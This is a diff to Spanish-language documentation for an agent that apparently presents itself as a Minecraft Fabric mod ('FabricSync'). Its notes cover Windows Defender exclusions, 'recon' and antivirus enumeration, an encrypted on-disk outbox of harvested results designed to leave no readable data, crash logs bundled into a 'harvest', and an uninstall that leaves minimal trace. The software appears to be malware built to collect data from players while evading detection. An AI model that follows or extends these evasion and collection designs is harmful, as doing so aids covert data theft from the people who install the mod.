@@ -220,3 +220,25 @@ Remove-Item "$env:LOCALAPPDATA\FabricSync" -Recurse -Force
 Remove-Item "$env:APPDATA\.minecraft\mods\fabric-sync-*.jar" -Force
 # y quitar las exclusiones de Defender que apunten al árbol
 ```
+
+## Outbox cifrado (0.3.9)
+
+Los resultados pendientes viven en `cache/outbox/` como `SPCB2 || flags ||
+epoch(u32) || nonce || AES-GCM`, con AAD ligado al nombre de fichero. No hay
+JSON legible en disco. Cada epoch tiene su clave `outbox_key` derivada del
+secreto, del salt y del label; se conservan tres epochs. Límite 4.000 entradas /
+64 MiB. El temporal vive dentro de `outbox/`; si el volumen no admite
+`ATOMIC_MOVE` se hace `fsync` + rename y se marca la entrada. Un barrido al
+arrancar borra temporales huérfanos. Los descartes van a `outbox/dead`; los
+resultados retenidos por un 410 van a `outbox/held` y expiran a los 7 días. Las
+entradas `SPCB1` anteriores siguen legibles.
+
+El estado expone `key_epoch` y `key_salts` (máximo 3) en `state.json`; un epoch
+evadido se reporta como `outbox_dropped` con motivo `unknown_epoch`.
+
+## Superficie 0.3.9
+
+`wmic` desaparece de recon, AV, PID del juego y vista de arranque; todo pasa
+por CIM, que falla como `cim_unavailable` sin romper el resto. El crash dump
+`hs_err_pid*.log` se mueve a `cache/crash/` y viaja en el harvest solo si es
+pequeño. `agent uninstall` deja rastro mínimo y borra en diferido.
